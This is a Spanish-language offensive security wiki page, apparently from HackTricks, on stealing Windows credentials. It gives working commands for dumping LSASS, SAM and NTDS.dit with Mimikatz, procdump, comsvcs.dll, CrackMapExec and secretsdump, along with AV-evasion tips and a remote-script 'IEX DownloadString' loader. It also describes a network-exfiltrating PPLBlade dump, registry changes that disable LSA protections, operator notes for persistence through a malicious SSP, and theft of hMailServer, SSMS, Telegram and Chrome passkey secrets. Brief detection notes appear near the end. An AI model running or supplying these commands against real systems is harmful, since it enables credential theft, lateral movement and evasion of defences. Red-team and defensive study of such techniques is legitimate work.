# Robar credenciales de Windows

{{#include ../../banners/hacktricks-training.md}}

## Credenciales de Mimikatz

```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```

**Encuentra otras cosas que Mimikatz puede hacer en** [**esta página**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz

```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```

[**Aprende sobre algunas posibles protecciones de credenciales aquí.**](credentials-protections.md) **Este tipo de protecciones podrían impedir que Mimikatz extraiga algunas credenciales.**

## Credenciales con Meterpreter

Usa el [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **que** he creado para **buscar contraseñas y hashes** dentro de la víctima.

```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```

## Evasión de AV

### Procdump + Mimikatz

Como **Procdump de** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**es una herramienta legítima de Microsoft**, Defender no lo detecta.\
Puedes usar esta herramienta para **volcar el proceso lsass**, **descargar el dump** y **extraer** las **credenciales localmente** del dump.

También puedes usar [SharpDump](https://github.com/GhostPack/SharpDump).

```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```

Este proceso se realiza automáticamente con [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Nota**: Algunos **AV** pueden **detectar** como **malicioso** el uso de **procdump.exe para volcar lsass.exe**, porque están **detectando** las cadenas **"procdump.exe" y "lsass.exe"**. Por eso, es más **sigiloso** pasar como **argumento** el **PID** de lsass.exe a procdump **en lugar del** **nombre lsass.exe.**

### Dumping de lsass con **comsvcs.dll**

Una DLL llamada **comsvcs.dll**, ubicada en `C:\Windows\System32`, es responsable de **volcar la memoria del proceso** en caso de un fallo. Esta DLL incluye una **función** llamada **`MiniDumpW`**, diseñada para invocarse mediante `rundll32.exe`.\
No importa usar los dos primeros argumentos, pero el tercero se divide en tres componentes. El ID del proceso que se va a volcar constituye el primer componente, la ubicación del archivo de volcado representa el segundo y el tercer componente debe ser estrictamente la palabra **full**. No hay opciones alternativas.\
Después de analizar estos tres componentes, la DLL crea el archivo de volcado y transfiere a este la memoria del proceso especificado.\
Se puede usar **comsvcs.dll** para volcar el proceso lsass, por lo que no es necesario cargar y ejecutar procdump. Este método se describe en detalle en [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).<sup>[[9]](#references)</sup>

Se utiliza el siguiente comando para ejecutarlo:

```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```

**Puedes automatizar este proceso con** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Volcar lsass con el Administrador de tareas**

1. Haz clic derecho en la barra de tareas y selecciona Administrador de tareas
2. Haz clic en Más detalles
3. Busca el proceso «Local Security Authority Process» en la pestaña Procesos
4. Haz clic derecho en el proceso «Local Security Authority Process» y selecciona «Crear archivo de volcado».

### Volcar lsass con procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) es un binario firmado por Microsoft que forma parte del conjunto de herramientas [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).

Un volcado de memoria de un bloqueo de todo el sistema que ya exista, o una copia comprimida en una carpeta de usuario accesible, puede conservar material de credenciales para analizarlo sin conexión. Los nombres de archivo como `MEMORY.DMP` y `MEMORY.7z` son solo indicios que conviene revisar: verifica su procedencia y acceso, y no des por sentado que contienen credenciales utilizables o actuales.

```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```

## Dumping de lsass con PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) es una herramienta para dumpear procesos protegidos que permite ofuscar el memory dump y transferirlo a estaciones de trabajo remotas sin guardarlo en el disco.

**Funciones principales**:

1. Evadir la protección PPL
2. Ofuscar los archivos memory dump para evadir los mecanismos de detección de Defender basados en firmas
3. Subir el memory dump mediante métodos de carga RAW y SMB sin guardarlo en el disco (fileless dump)

```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```

## LalsDumper – Dump de LSASS basado en SSP sin MiniDumpWriteDump

Ink Dragon utiliza un dumper de tres etapas llamado **LalsDumper** que nunca llama a `MiniDumpWriteDump`, por lo que los hooks de EDR en esa API nunca se activan:<sup>[[3]](#references)</sup>

1. **Cargador de la etapa 1 (`lals.exe`)** – busca en `fdp.dll` un marcador de posición compuesto por 32 caracteres `d` en minúscula, lo reemplaza por la ruta absoluta a `rtu.txt`, guarda la DLL modificada como `nfdp.dll` y llama a `AddSecurityPackageA("nfdp","fdp")`. Esto obliga a **LSASS** a cargar la DLL maliciosa como un nuevo Security Support Provider (SSP).
2. **Etapa 2 dentro de LSASS** – cuando LSASS carga `nfdp.dll`, la DLL lee `rtu.txt`, aplica XOR a cada byte con `0x20` y asigna el blob decodificado en memoria antes de transferir la ejecución.
3. **Dumper de la etapa 3** – el payload asignado en memoria vuelve a implementar la lógica de MiniDump mediante **direct syscalls** resueltos a partir de nombres de API hasheados (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Una exportación dedicada llamada `Tom` abre `%TEMP%\<pid>.ddt`, transmite un dump comprimido de LSASS al archivo y cierra el identificador para que la exfiltración pueda realizarse más tarde.

Notas para el operador:

* Mantén `lals.exe`, `fdp.dll`, `nfdp.dll` y `rtu.txt` en el mismo directorio. La etapa 1 reemplaza el marcador de posición codificado con la ruta absoluta a `rtu.txt`, así que separarlos interrumpe la cadena.
* El registro se realiza agregando `nfdp` a `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Puedes agregar ese valor tú mismo para que LSASS vuelva a cargar el SSP en cada inicio.
* Los archivos `%TEMP%\*.ddt` son dumps comprimidos. Descomprímelos localmente y luego pásalos a Mimikatz/Volatility para extraer credenciales.
* Ejecutar `lals.exe` requiere privilegios de administrador/SeTcb para que `AddSecurityPackageA` tenga éxito; una vez que la llamada devuelve el control, LSASS carga de forma transparente el SSP malicioso y ejecuta la etapa 2.
* Eliminar la DLL del disco no la expulsa de LSASS. Elimina la entrada del registro y reinicia LSASS (reiniciando el sistema), o déjala allí para mantener la persistencia a largo plazo.

## CrackMapExec

### Dump de hashes SAM

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```

### Dump de secretos de LSA

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```

### Dump del NTDS.dit del DC objetivo

```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```

### Extraer el historial de contraseñas de NTDS.dit del DC objetivo

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```

### Mostrar el atributo pwdLastSet de cada cuenta de NTDS.dit

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```

## Robar SAM y SYSTEM

Estos archivos deberían estar **ubicados** en _C:\windows\system32\config\SAM_ y _C:\windows\system32\config\SYSTEM._ Pero **no puedes simplemente copiarlos de la forma habitual** porque están protegidos.

### Desde el Registro

La forma más sencilla de robar esos archivos es obtener una copia del Registro:

```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```

**Descarga** esos archivos en tu máquina Kali y **extrae los hashes** mediante:

```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```

### Copia de sombra de volumen

Puedes copiar archivos protegidos mediante este servicio. Necesitas ser Administrador.

#### Usando vssadmin

El binario vssadmin solo está disponible en las versiones de Windows Server.

```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

Pero puedes hacer lo mismo desde **Powershell**. Este es un ejemplo de **cómo copiar el archivo SAM** (la unidad usada es "C:" y se guarda en C:\users\Public), pero puedes usarlo para copiar cualquier archivo protegido:

```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```

Código del libro: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

Por último, también podrías usar el [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) para hacer una copia de SAM, SYSTEM y ntds.dit.

```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```

## **Credenciales de Active Directory - NTDS.dit**

El archivo **NTDS.dit** se conoce como el corazón de **Active Directory** y contiene datos cruciales sobre objetos de usuario, grupos y sus pertenencias. Es donde se almacenan los **hashes de contraseñas** de los usuarios del dominio. Este archivo es una base de datos del **Extensible Storage Engine (ESE)** y se encuentra en **_%SystemRoom%/NTDS/ntds.dit_**.

Esta base de datos contiene tres tablas principales:

- **Tabla de datos**: Esta tabla se encarga de almacenar detalles de objetos como usuarios y grupos.
- **Tabla de vínculos**: Registra las relaciones, como las pertenencias a grupos.
- **Tabla SD**: Aquí se almacenan los **descriptores de seguridad** de cada objeto, que garantizan la seguridad y el control de acceso de los objetos almacenados.

La investigación de Christoffer Andersson sobre la capa de base de datos documenta estas tablas y su comportamiento específico según la versión con más detalle.<sup>[[8]](#references)</sup>

Windows usa _Ntdsa.dll_ para interactuar con ese archivo, y _lsass.exe_ también lo utiliza. Por lo tanto, **parte** del archivo **NTDS.dit** podría encontrarse **en la memoria de `lsass`** (probablemente, puedes encontrar los datos a los que se accedió más recientemente gracias a la mejora del rendimiento mediante una **caché**).

#### Descifrar los hashes dentro de NTDS.dit

El hash se cifra tres veces:

1. Descifrar la clave de cifrado de contraseñas (**PEK**) con **BOOTKEY** y **RC4**.
2. Descifrar el **hash** con **PEK** y **RC4**.
3. Descifrar el **hash** con **DES**.

La **PEK** tiene el **mismo valor en todos los controladores de dominio**, pero está **cifrada** dentro de **NTDS.dit** con la **BOOTKEY** específica del controlador de dominio, obtenida de su subárbol **SYSTEM**. Por lo tanto, para extraer las credenciales se necesitan tanto **NTDS.dit** como **SYSTEM** (`C:\Windows\System32\config\SYSTEM`).

### Copiar NTDS.dit con Ntdsutil

Disponible desde Windows Server 2008.

```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```

También puedes usar el truco de [**volume shadow copy**](#stealing-sam-and-system) para copiar el archivo **ntds.dit**. Recuerda que también necesitarás una copia del **archivo SYSTEM** (de nuevo, puedes [**volcarlo desde el registro o usar el truco de volume shadow copy**](#stealing-sam-and-system)).

### **Extracción de hashes de NTDS.dit**

Una vez que hayas **obtenido** los archivos **NTDS.dit** y **SYSTEM**, puedes usar herramientas como _secretsdump.py_ para **extraer los hashes**:

```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```

También puedes **extraerlas automáticamente** usando un usuario administrador de dominio válido:

```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```

Para los archivos **NTDS.dit grandes**, se recomienda extraerlos con [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Por último, también puedes usar el **módulo de metasploit**: _post/windows/gather/credentials/domain_hashdump_ o **mimikatz** `lsadump::lsa /inject`

### **Extracción de objetos de dominio de NTDS.dit a una base de datos SQLite**

Los objetos de NTDS se pueden extraer a una base de datos SQLite con [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Se extraen no solo los secretos, sino también los objetos completos y sus atributos, para extraer más información cuando ya se ha obtenido el archivo NTDS.dit sin procesar.

```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```

El hive `SYSTEM` es opcional, pero permite descifrar secretos (hashes NT y LM, credenciales suplementarias como contraseñas en texto claro, claves de Kerberos o de confianza, e historiales de contraseñas NT y LM). Además de otra información, se extraen los siguientes datos: cuentas de usuario y de equipo con sus hashes, flags de UAC, marcas de tiempo del último inicio de sesión y del último cambio de contraseña, descripciones de las cuentas, nombres, UPN, SPN, grupos y pertenencias recursivas, árbol de unidades organizativas y sus miembros, y dominios de confianza con el tipo, la dirección y los atributos de las relaciones de confianza...

## Lazagne

Descarga el binario desde [aquí](https://github.com/AlessandroZ/LaZagne/releases). Puedes usar este binario para extraer credenciales de varios programas.

```
lazagne.exe all
```

## Otras herramientas para extraer credenciales de SAM y LSASS

### Windows credentials Editor (WCE)

Esta herramienta se puede usar para extraer credenciales de la memoria. Descárgala desde: [http://www.ampliasecurity.com/research/windows-credentials-editor/](http://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Extrae credenciales del archivo SAM

```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```

### PwDump

Extraer credenciales del archivo SAM

```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```

### PwDump7

Descárgalo desde:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) y simplemente **ejecútalo** para extraer las contraseñas.

## Minería de sesiones RDP inactivas y debilitamiento de los controles de seguridad

El RAT FinalDraft de Ink Dragon incluye una tarea `DumpRDPHistory` cuyas técnicas son útiles para cualquier red-teamer:<sup>[[3]](#references)</sup>

### Recopilación de telemetría al estilo de DumpRDPHistory

* **Destinos RDP salientes**: analiza cada hive de usuario en `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Cada subclave almacena el nombre del servidor, `UsernameHint` y la marca de tiempo de la última escritura. Puedes replicar la lógica de FinalDraft con PowerShell:

  ```powershell
  Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
      Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
        ForEach-Object {
            $server = Split-Path $_.Name -Leaf
            $user = (Get-ItemProperty $_.Name).UsernameHint
            "OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
        }
  }
  ```

* **Evidencia de RDP entrante** – consulta el registro `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` para buscar los ID de evento **21** (inicio de sesión correcto) y **25** (desconexión) y determinar quién administró el equipo:

  ```powershell
  Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
    | Where-Object { $_.Id -in 21,25 } \
    | Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
  ```

Una vez que sepas qué Domain Admin se conecta habitualmente, vuelca LSASS (con LalsDumper/Mimikatz) mientras su sesión **desconectada** siga existiendo. La alternativa de CredSSP + NTLM deja su verificador y sus tokens en LSASS, que luego se pueden reproducir a través de SMB/WinRM para obtener `NTDS.dit` o establecer persistencia en los controladores de dominio.

### Degradaciones del registro dirigidas por FinalDraft

El mismo implante también manipula varias claves del registro para facilitar el robo de credenciales:<sup>[[3]](#references)</sup>

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```

* `DisableRestrictedAdmin=1` deshabilita Restricted Admin para las conexiones RDP entrantes; **no** habilita pass-the-hash mediante ese modo. Establecer el valor en `0` permite Restricted Admin en el destino, pero el cliente debe solicitar `/RestrictedAdmin` o usar una directiva que exija Restricted Admin.<sup>[[14]](#references)</sup> Un hash por sí solo no concede derechos de administrador remoto; consulta [requisitos previos de autenticación RDP](../../network-services-pentesting/pentesting-rdp.md).<sup>[[15]](#references)</sup>
* `LocalAccountTokenFilterPolicy=1` deshabilita el filtrado de tokens de UAC para que los administradores locales obtengan tokens sin restricciones a través de la red.
* `DSRMAdminLogonBehavior=2` permite que el administrador de DSRM inicie sesión mientras el DC está en línea, lo que proporciona a los atacantes otra cuenta integrada con privilegios elevados.
* `RunAsPPL=0` elimina las protecciones PPL de LSASS y facilita el acceso a la memoria para herramientas de volcado como LalsDumper.

## Credenciales de configuración de hMailServer (post-compromise)

Comprueba los archivos de configuración exactos `C:\Program Files\hMailServer\Bin\hMailServer.ini`, `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` y `C:\ProgramData\hMailServer\hMailServer.ini`, según el diseño de la instalación. Un valor legible y no vacío de `[Security] AdministratorPassword=` es un hash de la contraseña de administración de hMailServer; no demuestra que sea la contraseña de un administrador de Windows. Si se recupera esa credencial, cualquier movimiento lateral a una cuenta de Windows requiere verificar de forma independiente la reutilización de contraseñas y los derechos de inicio de sesión.

En las instalaciones que usan una base de datos SQL CE, el valor independiente `[Database] Password=` del archivo INI protege la base de datos. En instalaciones antiguas, este valor está cifrado con Blowfish mediante la clave estática `THIS_KEY_IS_NOT_SECRET` y cambios en el orden de bytes de palabras de 4 bytes. Usa la cadena hexadecimal del archivo INI con este fragmento de Python:<sup>[[2]](#references)</sup>

Primero, confirma que la cuenta actual puede leer tanto el archivo INI como la base de datos SQL CE `.sdf` correspondiente. La contraseña del INI protege la base de datos; es independiente de los hashes de las cuentas de buzón almacenados en ella. Inspecciona o actualiza una **copia** de una base de datos en uso, nunca el archivo activo.

```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
    return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```

Con la contraseña en texto claro, copia la base de datos de SQL CE para evitar bloqueos de archivo, carga el proveedor de 32 bits y actualízalo si es necesario antes de consultar los hashes:

```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```

La columna `accountpassword` usa el formato de hash de hMailServer (modo `1421` de hashcat). Una contraseña de buzón descifrada permite pivotar a un usuario de Windows solo si esa contraseña se reutiliza en una cuenta local o de dominio y dicha cuenta tiene los derechos necesarios para el inicio de sesión remoto.

## Intercepción de la devolución de llamada de inicio de sesión de LSA (LsaApLogonUserEx2)

Algunas herramientas capturan **contraseñas de inicio de sesión en texto plano** interceptando la devolución de llamada de inicio de sesión de LSA `LsaApLogonUserEx2`. La idea es conectar un hook o envolver la devolución de llamada del paquete de autenticación para capturar las credenciales **durante el inicio de sesión** (antes del hashing) y, después, escribirlas en el disco o devolverlas al operador. Esto suele implementarse como un ayudante que se inyecta en LSA o se registra en este, y luego registra cada evento de inicio de sesión interactivo o de red que se completa correctamente, junto con el nombre de usuario, el dominio y la contraseña.<sup>[[1]](#references)</sup>

Notas operativas:
- Se requieren privilegios de administrador local/SYSTEM para cargar el ayudante en la ruta de autenticación.
- Las credenciales capturadas solo aparecen cuando se produce un inicio de sesión (interactivo, RDP, de servicio o de red, según el hook).

## Credenciales de conexión guardadas de SSMS (sqlstudio.bin)

SQL Server Management Studio (SSMS) almacena la información de conexión guardada en un archivo `sqlstudio.bin` por usuario. Herramientas especializadas pueden analizar el archivo y recuperar las credenciales de SQL guardadas. En shells que solo devuelven la salida de los comandos, a menudo se exfiltra el archivo codificándolo como Base64 e imprimiéndolo en stdout.<sup>[[1]](#references)</sup>

```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```

En el lado del operador, reconstruye el archivo y ejecuta el dumper localmente para recuperar credenciales:

```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```

## Robo de sesiones del navegador y cookies mediante Chrome DevTools Protocol

{{#ref}}
../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md#enabling-cdp-inside-a-live-chromium-process
{{#endref}}

## Robo de sesiones de Telegram Desktop `tdata`

Telegram Desktop almacena la autorización y el estado de la cuenta en su directorio **`tdata`**. Una sesión copiada puede cargarse con herramientas compatibles para autenticarse sin la contraseña de la cuenta mientras esa autorización siga siendo válida; si está habilitado el cifrado de datos locales, el stealer también necesita el código de acceso. Después, una sesión autenticada puede exponer datos de identidad, metadatos de diálogos y membresías, mensajes y contenido multimedia descargable.<sup>[[10]](#references)</sup>

### Descubrimiento y adquisición

Busca tanto instalaciones como diseños portátiles; los nombres de los paquetes de Microsoft Store varían, así que enumera los directorios de paquetes que contengan `TelegramMessenge` e inspecciona su subárbol `LocalCache\Roaming`.<sup>[[10]](#references)</sup>

```powershell
# Standard Telegram Desktop installation
$env:APPDATA + '\Telegram Desktop\tdata'

# Microsoft Store packages
Get-ChildItem "$env:LOCALAPPDATA\Packages" -Directory |
  Where-Object Name -Like '*TelegramMessenge*' |
  ForEach-Object { Get-ChildItem "$($_.FullName)\LocalCache\Roaming" -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue }

# Portable/nonstandard copies (expensive and noisy)
Get-ChildItem C:\ -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue
```

Si las lecturas normales fallan y el token del proceso **ya contiene y tiene habilitado** `SeBackupPrivilege`, el acceso compatible con copias de seguridad ofrece una alternativa; no obtiene el privilegio ni eleva el proceso. `CreateFileW` con `FILE_FLAG_BACKUP_SEMANTICS` puede solicitar semántica de copia de seguridad/restauración y omitir las comprobaciones de seguridad de archivos cuando el token contiene los privilegios requeridos, pero la marca por sí sola no supera un bloqueo de uso compartido incompatible.<sup>[[10]](#references)[[11]](#references)</sup>

Para archivos bloqueados en uso, crea/lee una **Volume Shadow Copy**; para archivos bloqueados por ACL, `robocopy /B` usa el modo de copia de seguridad y omite las ACL de archivos y directorios.<sup>[[10]](#references)[[12]](#references)</sup>

```cmd
whoami /priv
robocopy "%APPDATA%\Telegram Desktop\tdata" "C:\Temp\tdata" /E /B
```

Un implant que tenga en cuenta el ancho de banda puede enviar primero solo el inventario de rutas de archivos, recibir un identificador de snapshot junto con las rutas que el C2 ya tiene almacenadas y cargar únicamente los archivos que faltan. Por lo tanto, las pequeñas transferencias incrementales posteriores a la enumeración recursiva de `tdata` aún pueden representar un robo de sesión exitoso.<sup>[[10]](#references)</sup>

### Detección y contención

Correlaciona el acceso recursivo a `tdata` por parte de un proceso que no sea de Telegram con la habilitación de `SeBackupPrivilege`, la apertura de archivos con semántica de copia de seguridad, la actividad de VSS o un proceso secundario `robocopy.exe` que use `/B`. Busca también la enumeración rápida tanto de `%APPDATA%` como de `%LOCALAPPDATA%\Packages`, seguida de conexiones salientes desde el mismo proceso. Tras la vulneración, usa **Configuración → Dispositivos** (o **Privacidad y seguridad → Sesiones activas**) para terminar las sesiones que no reconozcas; habilitar la verificación en dos pasos por sí solo no revoca una autorización que ya haya sido robada.<sup>[[10]](#references)[[13]](#references)</sup>

## Robo de credenciales Passkeys / WebAuthn de Chrome en Windows

Si se obtiene ejecución de código como **usuario víctima** en un host Windows que utiliza **Chrome + passkeys sincronizadas con Google Password Manager**, las passkeys se convierten en un objetivo interesante de post-exploitation, incluso **sin admin/SYSTEM**.<sup>[[4]](#references)</sup>

### Artefactos locales interesantes

```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```

- **`Sync Data\LevelDB`** almacena registros **`WebauthnCredentialSpecifics`** codificados en protobuf. Un proceso del mismo usuario puede enumerar el **RP ID**, el **username**, el **credential ID** y el material de clave privada cifrado de las passkeys sincronizadas.<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`** almacena el estado local de inscripción del dispositivo, como **`wrapped_identity_private_key`** y el secreto envuelto que se usa para recuperar las credenciales sincronizadas.<sup>[[4]](#references)</sup>

Triaje rápido:

```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
  Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
  Select-Object FullName, Length, LastWriteTime
```

### Los blobs de claves vinculadas al TPM aún pueden usarse como un oráculo local de firma

Si el navegador exporta una clave de identidad respaldada por TPM como **`NCRYPT_OPAQUE_KEY_BLOB`** y almacena ese blob en un estado accesible para el usuario, el malware **no** necesita extraer la clave privada sin procesar. Simplemente puede volver a importar el blob en la **misma máquina** y pedirle al TPM local que firme datos controlados por el atacante:<sup>[[4]](#references)[[6]](#references)</sup>

```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```

Esto significa que **el enlace al hardware impide la exportación fuera del dispositivo, pero no el uso por el mismo usuario en el endpoint comprometido**.

### Vías prácticas de abuso

1. **Pass-ta-key / retransmisión de identidad del dispositivo**<sup>[[4]](#references)</sup>
   - Enumerar `WebauthnCredentialSpecifics` desde el LevelDB de Chrome.
   - Iniciar un inicio de sesión con passkey y obtener un desafío WebAuthn nuevo.
   - Usar el blob `wrapped_identity_private_key` robado en el TPM de la víctima para firmar la vinculación de la solicitud del cloud-authenticator.
   - Retransmitir la aserción devuelta al proveedor de confianza.
   - Esto es especialmente valioso cuando el RP acepta `userVerification=preferred` o no rechaza aserciones con **`UV=0`**.
2. **Secuestro de una clave UV pendiente**<sup>[[4]](#references)</sup>
   - Forzar la incorporación de nuevo eliminando `passkey_enclave_state` o enviando una operación `device/forget` firmada válida.
   - Si el proceso de incorporación deja el dispositivo en **`uv_key_pending`**, registrar una clave pública UV controlada por el atacante.
   - Si el proveedor no verifica la atestación / el origen de hardware seguro de la nueva clave UV, las firmas posteriores de la clave del atacante se consideran **`UV=1`**.
3. **Robo del secreto maestro / recuperación de SDS**<sup>[[4]](#references)</sup>
   - Forzar la recuperación o la reincorporación para que Chrome obtenga el secreto maestro de las passkeys sincronizadas.
   - Vigilar la recreación o modificación de `passkey_enclave_state` y, a continuación, volcar la memoria de Chrome mientras el **secreto del dominio de seguridad (SDS)** en texto claro esté presente.
   - Usar el SDS recuperado para descifrar los campos cifrados de cada registro `WebauthnCredentialSpecifics` y recuperar claves privadas WebAuthn portátiles.

### Ideas para DFIR y detección

- Supervisar la **eliminación/recreación** de `passkey_enclave_state`.<sup>[[4]](#references)</sup>
